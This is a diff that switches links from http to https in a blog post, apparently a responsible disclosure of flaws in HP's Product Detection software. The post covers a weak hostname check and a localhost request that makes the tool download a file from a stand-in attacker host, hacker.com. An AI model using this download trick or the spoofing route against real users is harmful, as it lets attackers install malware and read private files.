@@ -6,12 +6,12 @@ tags:
    - security
 ---
 
-After discovering [the flaw in Dell's System Detect software](http://tomforb.es/dell-system-detect-rce-vulnerability) I looked into other similar software for issues. This post details two issues I found with the HP Product Detection software and explores the protections HP put in place. I'm also going to explain how they could be easily bypassed to allow an attacker to force files to be downloaded, read arbitrary data, registry keys and system information through the users browser with little or no interaction.
+After discovering [the flaw in Dell's System Detect software](https://tomforb.es/dell-system-detect-rce-vulnerability) I looked into other similar software for issues. This post details two issues I found with the HP Product Detection software and explores the protections HP put in place. I'm also going to explain how they could be easily bypassed to allow an attacker to force files to be downloaded, read arbitrary data, registry keys and system information through the users browser with little or no interaction.
 
 
 *Timeline:*
 
-HP were incredibly prompt at fixing the issue and responding to communications. They have addressed these problems in a new version (11.51.0049) and have issued a security notification, [available here](https://h20564.www2.hp.com/hpsc/doc/public/display?docId=emr_na-c04634535). An updated version can (and should) be downloaded from [their support page](http://support.hp.com)
+HP were incredibly prompt at fixing the issue and responding to communications. They have addressed these problems in a new version (11.51.0049) and have issued a security notification, [available here](https://h20564.www2.hp.com/hpsc/doc/public/display?docId=emr_na-c04634535). An updated version can (and should) be downloaded from [their support page](https://support.hp.com)
 
    * 25/3/2015 - Contacted HP with a writeup and received an acknowledgement that it has been passed to the relevant software team
    * 10/4/2015 - Received notification that the vulnerability has been fixed
@@ -22,7 +22,7 @@ Many large hardware vendors offer tools to automatically detect the hardware con
 
 ![](./detect_my_product_H26MGOLW.png)
 
-Unfortunately just like Dell the HP software contains a number of functions that you wouldn't expect. When you click "Find Now" you are actually downloading the complete [HP Support Solutions Framework](http://h20614.www2.hp.com/ediags/gmd/about.aspx?lc=en&cc=uk) which includes functionality to:
+Unfortunately just like Dell the HP software contains a number of functions that you wouldn't expect. When you click "Find Now" you are actually downloading the complete [HP Support Solutions Framework](https://h20614.www2.hp.com/ediags/gmd/about.aspx?lc=en&cc=uk) which includes functionality to:
 
    * Read arbitrary files and registry keys
    * Collect system information
@@ -36,7 +36,7 @@ As previously stated the software installs a service on your computer and listen
 
 ![](./browser_NCM47OY5.png)
 
-When a browser makes a HTTP request the browser adds some information to the headers about the page or context that initiated the request, in the **Referer** (yes, spelt like that) and **Origin** headers. Under usual circumstances these requests would be coming from the HP support site, so the **Referer** header might have a value of **http://www8.hp.com/uk/en/drivers.html**.
+When a browser makes a HTTP request the browser adds some information to the headers about the page or context that initiated the request, in the **Referer** (yes, spelt like that) and **Origin** headers. Under usual circumstances these requests would be coming from the HP support site, so the **Referer** header might have a value of **https://www8.hp.com/uk/en/drivers.html**.
 
 So let's get right into the code and see how these headers are used. After decompiling the software we find the following (abbreviated) function inside *SolutionsFrameworkService.SsfWebserver*:
 
@@ -45,9 +45,9 @@ private void GetContextCallback(IAsyncResult result)
 {
    string uriString;
    if (request.QueryString.Get("callback") != null)
-      uriString = request.Headers["Referer"] ?? "http://hp.com";
+      uriString = request.Headers["Referer"] ?? "https://hp.com";
    else
-     uriString = request.Headers["Origin"] ?? "http://hp.com";
+     uriString = request.Headers["Origin"] ?? "https://hp.com";
 
    if (!new Uri(uriString).GetComponents(UriComponents.Host, UriFormat.Unescaped).EndsWith("hp.com"))
    {
@@ -64,13 +64,13 @@ The line we need to focus on is this:
     
     if (!new Uri(uriString).GetComponents(UriComponents.Host, UriFormat.Unescaped).EndsWith("hp.com"))
 
-In English this translates to **if the hostname ends with hp.com**, which is the **only way the program authenticates a valid request**. On the face of it this might look like a perfectly valid way to ensure that a HTTP request came from a valid HP domain however it is critically flawed. The check only checks if the domain **ends** with hp.com, so if a hacker were to register the domain **nothp.com** and make a request from there then it would pass the check. Apart from [giving me Déjà vu](http://tomforb.es/dell-system-detect-rce-vulnerability) it also gives me a foot in the door - any command I issue will be processed by the software. So let's see what commands can be processed.
+In English this translates to **if the hostname ends with hp.com**, which is the **only way the program authenticates a valid request**. On the face of it this might look like a perfectly valid way to ensure that a HTTP request came from a valid HP domain however it is critically flawed. The check only checks if the domain **ends** with hp.com, so if a hacker were to register the domain **nothp.com** and make a request from there then it would pass the check. Apart from [giving me Déjà vu](https://tomforb.es/dell-system-detect-rce-vulnerability) it also gives me a foot in the door - any command I issue will be processed by the software. So let's see what commands can be processed.
 
 
 ### Triggering a download
 When the program processes a request it inspects the first two components of the requested path. The first is used to look up a **controller**, and the second component (if present) specifies the **method**. In the Chrome screenshot above it is making a request to the **version** controller, which has one default action that returns the software version. Looking through the source there are several interesting controllers, but we shall start with the **HPDIAcontroller** which is used to drive the "HP Download and Install Assistant". The actual code is pretty convoluted and not particularly relevant, but what is interesting is that if we make a request to (some unimportant parameters omitted):
 
-    http://localhost:8092/hpdia/run?RemoteFile=https://hacker.com/messbox.exe&FileTitle=update.exe
+    https://localhost:8092/hpdia/run?RemoteFile=https://hacker.com/messbox.exe&FileTitle=update.exe
 
 Then this triggers the download assistant to start, which brings itself to the foreground downloads the file:
 
@@ -95,7 +95,7 @@ When an HP support technician attempts to diagnose problems with a customer's co
 
 ![](./HP_img_1_1_UEIGXEMD.png)
 
-You can view an example of the servers response by visiting the following URL: [http://diagsgmdextpro.houston.hp.com/ediags/solutions/harvestertemplate?productLine=KV](http://diagsgmdextpro.houston.hp.com/ediags/solutions/harvestertemplate?productLine=KV), and below is a snippet of the result that instructs the software to read a registry key:
+You can view an example of the servers response by visiting the following URL: [https://diagsgmdextpro.houston.hp.com/ediags/solutions/harvestertemplate?productLine=KV](https://diagsgmdextpro.houston.hp.com/ediags/solutions/harvestertemplate?productLine=KV), and below is a snippet of the result that instructs the software to read a registry key:
 
 ```xml
 <TemplateFile>
@@ -119,7 +119,7 @@ You can view an example of the servers response by visiting the following URL: [
 
 This isn't actually a terrible system, because the system contacts an authoritative service to retrieve a list of files to download rather than accept this data from the client directly. 
 
-So how can an attacker exploit this? He or she need to trick the application into connecting to their server instead of one hosted by HP. One possible way to do this is to use a DNS spoofing attack (like [DNS cache poisoning](https://en.wikipedia.org/wiki/DNS_spoofing)) so that the domain *diagsgmdextpro.houston.hp.com* resolves to an IP address they control. Another possible way is to [man in the middle](http://en.wikipedia.org/wiki/Man-in-the-middle_attack) their connection, as they use a plaintext HTTP request to send and receive data. How to exactly do this is outside the scope of this post but it is possible.
+So how can an attacker exploit this? He or she need to trick the application into connecting to their server instead of one hosted by HP. One possible way to do this is to use a DNS spoofing attack (like [DNS cache poisoning](https://en.wikipedia.org/wiki/DNS_spoofing)) so that the domain *diagsgmdextpro.houston.hp.com* resolves to an IP address they control. Another possible way is to [man in the middle](https://en.wikipedia.org/wiki/Man-in-the-middle_attack) their connection, as they use a plaintext HTTP request to send and receive data. How to exactly do this is outside the scope of this post but it is possible.
 
 Once done, the attacker can make the request to the users software and it will connect back to a machine that they control, which will instruct the software to read any file they choose.  Thus the following happens:
 
